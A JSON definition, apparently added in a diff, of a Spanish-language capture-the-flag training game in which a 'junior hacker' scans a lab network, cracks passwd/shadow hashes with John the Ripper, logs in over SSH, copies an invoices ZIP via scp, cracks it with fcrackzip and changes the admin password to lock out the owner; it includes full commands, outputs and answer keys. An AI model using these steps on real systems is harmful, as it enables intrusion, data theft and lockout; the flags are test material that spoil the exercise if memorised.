@@ -1,0 +1,305 @@
+{
+  "title" : "Junior Hacker Training - CTMA ",
+  "description" : "Introducción al Entrenamiento",
+  "prerequisites" : [ ],
+  "outcomes" : [ "Usted  aprenderá como escanear un servidor, como encontrar posibles vulnerabilidades y como explotarlas." ],
+  "state" : "UNRELEASED",
+  "show_stepper_bar" : true,
+  "levels" : [ {
+    "title" : "Introduction",
+    "level_type" : "INFO_LEVEL",
+    "order" : 0,
+    "estimated_duration" : 0,
+    "minimal_possible_solve_time" : null,
+    "content" : "# Información General: Por favor lea cuidadosamente\n\n* La solución de cada nivel **será necesaria** en los siguientes niveles. No trate de saltarse los diferentes niveles. Si logra dar una solución al nivel, complete todos los pasos, los necesitará más adelante.\n* Si en algún momento del juego, necesitas ayuda, siéntete libre de utilizar los diversos recursos en Internet\n* Este juego es solo para propósitos de formación y educación. El uso no autorizado de las diversas herramientas que se proponen en éste juego es ilegal y podría traer consecuencias legales. La historia en la que se basa el juego es ficticia\n\n\n\n# Introducción a la Historia del Juego\n\n\nBienvenido!!. Eres un hacker junior, que recientemente logró ingresar a la escuela ultra secreta de un legendario y reconocido Hacker, del cual se cuentan muchas hazañas.\n\n\nHoy es tu primer día de entrenamiento de campo y tu instructor asignado te llevará a uno de sus lugares favoritos: un espacio público con concurrencia de muchas personas. ¿Qué hace éste lugar tan especial?, pues bien, muchas personas sin conocimientos en ciberseguridad, hacen uso de infraestructuras y dispositivos de interconexión y comunicaciones, los cuales no cumplen con los requerimientos mínimos de seguridad, lo cual representa una invitación abierta a visitar estos espacios y descubrir todo o que allí sucede.\n\n\nEstas en un automóvil en el parqueadero de este espacio público. Tu instructor lleva su portátil con Kali Linux, además tu instructor está dispuesto a brindarte consejos, los cuales podrás utilizar el día de hoy.\n\n\nEl objetivo principal del entrenamiento del día es simple: **Robar cualquier tipo de información que represente algún valor.**\n"
+  }, {
+    "title" : "Conociendo el entorno",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 1,
+    "estimated_duration" : 3,
+    "minimal_possible_solve_time" : 2,
+    "answer" : "--help",
+    "answer_variable_name" : null,
+    "content" : "El instructor te ha entregado el equipo portátil y te ha dicho: \n\n\"Has estudiado bastante las ultimas semanas, trimestre a trimestre. Ahora estas listo para el entrenamiento de hacking en el mundo real, pero necesitas el equipo adecuado con las herramientas adecuadas. El día de hoy te orientaré en el manejo de Kali Linux y te mostraré algunas de sus funcionas y herramientas básicas, que te facilitará las tareas de hacking\"\n\n\"Lo primero que hay que aclarar es que Kali no es solo un sistema operativo basado en GNU/Linux. Esta distribución, contiene muchas herramientas de hacking, las cuales necesitaras el día de hoy para tu entrenamiento. No podemos evitar utilizar la herramienta **nmap**, la cual nos permite escanear la red: Permite visualizar direcciones IP de los diferentes elementos de red interconectados, también permite visualizar los servicios de red que corren en ciertos elementos de red y hasta la versión del servicio.\nAun así, mis herramientas favoritas de todos los tiempos son las utilizadas para hacer \"cracking\" de contraseñas, como **John the Ripper, Hydra o fcrackzip**. Intentaremos encontrar una oportunidad para que puedas probar algunas de estas herramientas. Cuando sea el momento adecuado de utilizar alguna de ellas te indicaré. Si no sabes utilizar la herramienta, recuerda.... debes utilizar la opción \"--help\" para obtener instrucciones detalladas del uso de la herramienta\"\n\n\"En segundo lugar, debes familiarizarte con la linea de comandos \"CLI\" pues ésta será la interface que mas utilizaras en Kali Linux. Inicie sesión con el usuario **'kali'** y contraseña **'kali'**, acceda a una terminal o una consola y explore el sistema de ficheros, observe la disposición y distribución de los ficheros y directorios. Necesitaras este conocimiento cuando realices tareas el hacking en otra maquina GNU/Linux\"\n\n-------------------------------------------------------------------------------------------\n\nLa \"flag\" para este nivel es la opción \"sufijo\" usado por los comandos para obtener información e instrucciones detalladas en el uso de algunas herramientas del CLI de GNU/Linux (Existen varias opciones, escoja la mas completa)\n",
+    "solution" : "La flag es la opcion o sufjo `--help`.",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Que es la opción o sufijo en un comando? ",
+      "content" : "La opción o sufijo va después de cada comando. El instructor le ha indicado el sufijo en la introducción a Kali Linux",
+      "hint_penalty" : 2,
+      "order" : 0
+    } ],
+    "incorrect_answer_limit" : 5,
+    "attachments" : [ ],
+    "max_score" : 3,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : false
+  }, {
+    "title" : "Descubriendo las Maquinas presentes en la red",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 2,
+    "estimated_duration" : 7,
+    "minimal_possible_solve_time" : 3,
+    "answer" : "4",
+    "answer_variable_name" : null,
+    "content" : "Has logrado obtener la contraseña de acceso a la red inalámbrica de un router Wi-Fi con la ayuda de tu instructor (12345678, ¿En serio?). Con éste dato ya puedes acceder a cierta información de la red. Al mismo tiempo, por medio herramientas de escaneo de red, debes encontrar otras maquinas maquinas conectadas a la red inalámbrica , descubre las direcciones IP de dichas maquinas.\n\n\nEl instructor te ha indicado que tu objetivo es hacer un descubrimiento de la red e identificar cuales maquinas están conectadas a la red haciendo uso de herramientas vía CLI. Dado que existen varias maquinas en la red, debes escanear la red completa asociada a la interface **eth1**.\n\n---------------------------------------------------\n\nLa flag es el numero de hosts descubiertos conectados a la misma red Wi-fi. (escrito en numero no en letras)",
+    "solution" : "```\nkali@attacker:~# netdiscover -i eth1 -r 10.1.26.0/24\n\n\n 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 168                                                                                                                                                                                     \n _____________________________________________________________________________\n   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      \n -----------------------------------------------------------------------------\n 10.1.26.1       fa:16:3e:4f:9e:1a      1      42  Unknown vendor                                                                                                                                                                                    \n 10.1.26.2       fa:16:3e:f7:f3:18      1      42  Unknown vendor                                                                                                                                                                                    \n 10.1.26.4       fa:16:3e:ba:78:22      1      42  Unknown vendor                                                                                                                                                                                    \n 10.1.26.9       fa:16:3e:ec:7b:89      1      42  Unknown vendor   \n\n```",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Cuales son los parametros que debo utilizar para escanear la red asociada a la interface eth1?",
+      "content" : "El comando netdiscover tiene dos opciones que pueden servir en este escenario:\n\n-i: especifica la interface que se utilizará para realizar el escaneo de red\n\n-r: especifica el rango de red sobre el que deseamos realizar el descubrimiento de hosts",
+      "hint_penalty" : 9,
+      "order" : 1
+    }, {
+      "title" : "Que herramienta usar?",
+      "content" : "Utilice la herramienta `netdiscover` por line a de comando (CLI)",
+      "hint_penalty" : 10,
+      "order" : 0
+    } ],
+    "incorrect_answer_limit" : 5,
+    "attachments" : [ ],
+    "max_score" : 20,
+    "variant_answers" : false,
+    "reference_solution" : [ {
+      "state_name" : "Red escaneada",
+      "prereq_state" : [ ],
+      "cmd" : "netdiscover -i eth1 -r 10.1.26.0/24",
+      "cmd_type" : "bash-command",
+      "cmd_regex" : "netdiscover -i eth1 -r 10.1.26.0/24",
+      "optional" : false
+    } ],
+    "mitre_techniques" : [ {
+      "technique_key" : "TA0043.T1595"
+    } ],
+    "expected_commands" : [ ],
+    "commands_required" : false
+  }, {
+    "title" : "Revisando las direcciones IP de las maquinas ",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 3,
+    "estimated_duration" : 7,
+    "minimal_possible_solve_time" : 3,
+    "answer" : "2049",
+    "answer_variable_name" : null,
+    "content" : "Has logrado identificar los dispositivos presentes en la red. Con éste dato ya puedes acceder a cierta información sobre los hosts que se encuentran en la red. Nos enfocaremos en estas dos direcciones IP: 10.1.26.4 y 10.1.26.9.\n\nEl instructor te ha indicado que tu objetivo es obtener acceso al servidor. Dado que nos enfocamos en dos maquinas especificas en la red, debes escanear estos dos hosts e identificar cual es la dirección IP del servidor. Puedes reconocer fácilmente cual de las dos maquinas es el servidor por los servicios de red que corren en dicha maquina y los puertos abiertos en ésta.\n\n---------------------------------------------------\n\nLa flag es el numero del puerto asociado al servicio \"Sistema de Archivos de Red\" que se encuentra corriendo en el servidor.",
+    "solution" : "```\nkali@attacker:~# nmap 10.1.26.4\n\nkali@attacker:~# nmap 10.1.26.9\n2049/tcp open  nfs\n```",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Que herramienta usar?",
+      "content" : "Utilice la herramienta `nmap` por line a de comando (CLI)",
+      "hint_penalty" : 5,
+      "order" : 0
+    }, {
+      "title" : "Cual dirección IPv4 debo escanear?",
+      "content" : "Escanee ambas direcciones IPv4, y compare cual de las dos maquinas corre el servicio descrito en la información.",
+      "hint_penalty" : 4,
+      "order" : 1
+    }, {
+      "title" : "Que herramienta usar?",
+      "content" : "Utilice la herramienta `nmap` por line a de comando (CLI)",
+      "hint_penalty" : 0,
+      "order" : 0
+    } ],
+    "incorrect_answer_limit" : 5,
+    "attachments" : [ ],
+    "max_score" : 10,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : false
+  }, {
+    "title" : "Rompiendo contraseñas de Linux",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 4,
+    "estimated_duration" : 30,
+    "minimal_possible_solve_time" : 20,
+    "answer" : "admin",
+    "answer_variable_name" : null,
+    "content" : "El instructor te da los detalles e información sobre unas posibles credenciales validas, pero no será tan facil. El instructor te ha ayudado proporcionándote dos ficheros importantes ( **passwd** y **shadow**) que con sus habilidades ha logrado extraer del servidor, estos ficheros se encuentran en el home del usuario kali de la maquina \"attacker\". Debes romper la contraseña del usuario **admin**, probablemente sean usuarios con contraseñas débiles y de uso común. Vale la pena intentarlo, ¿no?\n\n\nEl instructor te recomienda el uso de algunas herramientas para ésta tarea que, las cuales son sus preferidas, estas herramientas son: **unshadow** y **John The Ripper**\n\n\n------\n\nla flag es la contraseña del usuario admin",
+    "solution" : "kali@attacker:~#unshadow passwd shadow > passwords.txt\n\nkali@attacker:~#john passwords.txt \nUsing default input encoding: UTF-8                                                                                                                                                                                                                   \nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])                                                                                                                                                                       \nNo password hashes left to crack (see FAQ)   \n\nkali@attacker:~#john --show passwords.txt                                                                                                                                                                                                             \nadmin:admin:1002:1002::/home/admin:/bin/bash                                                                                                                                                                                                          \n                                                                                                                                                                                                                                                      \n1 password hash cracked, 0 left ",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Que herramienta usar para crackear el fichero de passwords?",
+      "content" : "Utilice la herramienta `john` por line a de comando (CLI) seguido de los fichero a crackear\n\n\n```\nkali@attacker:~#john passwords.txt\n\n```",
+      "hint_penalty" : 10,
+      "order" : 1
+    }, {
+      "title" : "Que herramienta usar para fusionar el fichero passwd y shadow?",
+      "content" : "Utilice la herramienta `unshadow` por line a de comando (CLI) seguido de los ficheros passwd y shadow respectivamente y redirija la salida a un nuevo fichero (el cual será crackeado)\n\n\n```\nkali@attacker:~#unshadow passwd shadow > passwords.txt\n\n```",
+      "hint_penalty" : 10,
+      "order" : 0
+    }, {
+      "title" : "Como visualizar los passwords crackeados por John The Ripper",
+      "content" : "Utilice la herramienta `john` por line a de comando (CLI) seguido de la opcion --show para visuailizar los passwords crackeados\n\n```\nkali@attacker:~#john --show passwords.txt\n\n```\n\n",
+      "hint_penalty" : 14,
+      "order" : 2
+    } ],
+    "incorrect_answer_limit" : 5,
+    "attachments" : [ ],
+    "max_score" : 35,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : false
+  }, {
+    "title" : "Conectándose al Servidor",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 5,
+    "estimated_duration" : 5,
+    "minimal_possible_solve_time" : 2,
+    "answer" : "ssh admin@10.1.26.9",
+    "answer_variable_name" : null,
+    "content" : "Ya conoces la dirección IPv4 del Servidor, un usuario y su contraseña, fue fácil, ¿verdad?. Ahora viene la parte mas interesante para usar todo este conocimiento para tu beneficio. Conéctate remotamente al servidor y utiliza unas credenciales validas.\n\n---------------------------------------------\n\nLa flag es el comando completo utilizado para acceder remotamente al servidor.\n",
+    "solution" : "```\nkali@attacker:~# ssh admin@10.1.26.9\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nadmin@10.1.26.9's password: admin\n```",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "¿Que contraseña utilizar para autenticarse?",
+      "content" : "Intenta con alguna de las que ha recomendado el Instructor",
+      "hint_penalty" : 3,
+      "order" : 2
+    }, {
+      "title" : "¿Cual es la sintaxis para utilizar el comando SSH por CLI?",
+      "content" : "La sintaxis es `ssh username@hostname_or_ip`, donde el parámetro después de `@` es la dirección IP o el FQDN del dispositivo al cual usted se quiere conectar.\n",
+      "hint_penalty" : 7,
+      "order" : 1
+    }, {
+      "title" : "Que método de acceso remoto utilizar?",
+      "content" : "Utilice el comando `ssh` por medio de la interface de línea de comandos CLI",
+      "hint_penalty" : 2,
+      "order" : 0
+    } ],
+    "incorrect_answer_limit" : 5,
+    "attachments" : [ ],
+    "max_score" : 12,
+    "variant_answers" : false,
+    "reference_solution" : [ {
+      "state_name" : "ssh_to_server",
+      "prereq_state" : [ "first_machine_scanned", "second_machine_scanned" ],
+      "cmd" : "ssh admin@10.1.26.9",
+      "cmd_type" : "bash-command",
+      "cmd_regex" : "ssh admin@10.1.26.9",
+      "optional" : false
+    } ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : false
+  }, {
+    "title" : "Buscando archivos de valor o importancia ",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 6,
+    "estimated_duration" : 5,
+    "minimal_possible_solve_time" : 3,
+    "answer" : "invoices2019.zip",
+    "answer_variable_name" : null,
+    "content" : "Has logrado acceder remotamente al servidor. Ahora es momento de encontrar algo realmente importante y comprometedor, pero no sabemos exactamente lo que estamos buscando. Sin embargo...... ¿aún recuerda la lista de servicios que se ejecutan en el servidor según la información obtenida con el comando Nmap?.\n\nYa sabes que el servidor corre un servicio **NFS**, el protocolo NFS es utilizado para compartir ficheros y acceder remotamente a dichos ficheros a través de una red de datos. Tal ves este servidor es utilizado para guardar copias de seguridad. Intente observar en el \"home\" del usuario admin cualquier archivo que pueda ser de importancia. Cuando lo identifique, copie dicho archivo en su maquina desde la cual está atacando \"attacker\".\n\n\n---------\n\nLa flag es el nombre del único fichero ZIP (incluyendo la extensión) almacenando en el \"home\" del usuario admin.\n\n",
+    "solution" : "```\nkali@attacker:/home# scp admin@10.1.26.9:~/invoices2019.zip .\nadmin@10.1.26.9's password: admin\n```",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "¿Donde buscar los ficheros?",
+      "content" : "Ubíquese en el `home` del usuario admin",
+      "hint_penalty" : 4,
+      "order" : 0
+    }, {
+      "title" : "¿Cual es la sintaxis para la herramienta SCP?",
+      "content" : "Utilice esta sintaxis para copiar ficherlos desde equipos remotos a la maquina local:\n\n`scp <user>@<host_remote>:<source path on remote machine> <destination on local machine>`",
+      "hint_penalty" : 2,
+      "order" : 2
+    }, {
+      "title" : "¿Como copiar los ficheros ZIP?",
+      "content" : "Utilice la herramienta `scp` desde la CLI para copiar el fichero",
+      "hint_penalty" : 6,
+      "order" : 1
+    } ],
+    "incorrect_answer_limit" : 5,
+    "attachments" : [ ],
+    "max_score" : 20,
+    "variant_answers" : false,
+    "reference_solution" : [ {
+      "state_name" : "scp_zip",
+      "prereq_state" : [ "ssh_to_server" ],
+      "cmd" : "scp admin@10.1.26.9:~/invoices2019.zip .",
+      "cmd_type" : "bash-command",
+      "cmd_regex" : "scp admin@10.1.26.9:~/invoices2019.zip .*",
+      "optional" : false
+    } ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : false
+  }, {
+    "title" : "Crackear el password del fichero zip",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 7,
+    "estimated_duration" : 15,
+    "minimal_possible_solve_time" : 10,
+    "answer" : "IhateMyJob",
+    "answer_variable_name" : null,
+    "content" : "Has encontrado que algunos ficheros que el área de Contabilidad ha sido subidos a este servidor. Existe un fichero ZIP con un nombre comprometedor que ya tienes bajo tu control, pero desafortunadamente, este fichero está protegido por un password. EL instructor te informa que se instaló una herramienta para romper las contraseñas, dicha herramienta se llama Fcrackzip y está instalada en su maquina Kali \"attacker\". Descubra como podría romper la contraseña y acceder al contenido del fichero ZIP.\n\n--------- \n\nLa flag es el password del fichero ZIP.",
+    "solution" : "```\nkali@attacker:~# fcrackzip -D -u -p /usr/share/wordlists/fasttrack.txt invoices2019.zip\n\nPASSWORD FOUND!!!!: pw == IhateMyJob\n\nkali@attacker:/home# unzip invoices2019.zip \n\nArchive:  invoices2019.zip\n   creating: invoices2019/\n[invoices2019.zip] invoices2019/TAX15796252.txt password: IhateMyJob\n```",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "¿Como utilizar la herramienta  Fcrackzip?",
+      "content" : "Usted puede realizar un ataque de diccionario utilizando la opción `-D` con el comando `fcrackzip`, pero debes tener en cuenta que debes hacer uso de una lista de palabras `wordlist`. Este diccionario está almacenado en alguna ruta del file system de la maquina Kali \"attacker\"\n\n",
+      "hint_penalty" : 8,
+      "order" : 0
+    }, {
+      "title" : "Cual es la ruta donde se encuentra la lista de palabras \"wordlist\"?",
+      "content" : "La lista de palabras \"Wordlist\" se encuentra ubicada en la ruta `/usr/share/wordlists`. En este caso, en este directorio solo existe un solo fichero de palabras. (Pero tenga en cuenta que en otros escenarios puede haber muchos mas ficheros con listas de palabras)\n\n",
+      "hint_penalty" : 6,
+      "order" : 1
+    } ],
+    "incorrect_answer_limit" : 5,
+    "attachments" : [ ],
+    "max_score" : 15,
+    "variant_answers" : false,
+    "reference_solution" : [ {
+      "state_name" : "use_fcrackzip",
+      "prereq_state" : [ "scp_zip" ],
+      "cmd" : "fcrackzip -D -u -p /usr/share/wordlists/fasttrack.txt invoices2019.zip",
+      "cmd_type" : "bash-command",
+      "cmd_regex" : "fcrackzip -D -u -p .*fasttrack.txt .*invoices2019.zip",
+      "optional" : false
+    } ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : false
+  }, {
+    "title" : "Deshabilitando el acceso al servidor para usuarios no autorizados",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 8,
+    "estimated_duration" : 5,
+    "minimal_possible_solve_time" : 2,
+    "answer" : "passwd admin",
+    "answer_variable_name" : null,
+    "content" : "!!Felicitaciones!!, Has logrado completar tu entrenamiento de hoy, tu instructor reconoce el buen trabajo que has realizado. Ademas obtuviste acceso a un directorio de facturas importantes y dependerá de usted lo que quiera hacer con dicha información. Pero no querrás irte sin divertirte un poco, cambia la contraseña del usuario admin en el servidor, para que el usuario legitimo no pueda acceder al equipo.\n\n---------\n\nLa flag es el comando utilizado para cambiar el password (incluyendo el nombre del usuario)\n",
+    "solution" : "```\nadmin@server:~# passwd admin\n```",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Que comando utilizar para cambiar el password del usuario?",
+      "content" : "Utilice la herramienta `passwd` especificando el nombre del usuario.\n",
+      "hint_penalty" : 4,
+      "order" : 0
+    } ],
+    "incorrect_answer_limit" : 5,
+    "attachments" : [ ],
+    "max_score" : 4,
+    "variant_answers" : false,
+    "reference_solution" : [ {
+      "state_name" : "finish",
+      "prereq_state" : [ "use_fcrackzip" ],
+      "cmd" : "passwd admin",
+      "cmd_type" : "bash-command",
+      "cmd_regex" : "passwd admin",
+      "optional" : false
+    } ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : false
+  } ],
+  "estimated_duration" : 77,
+  "variant_sandboxes" : false
+}
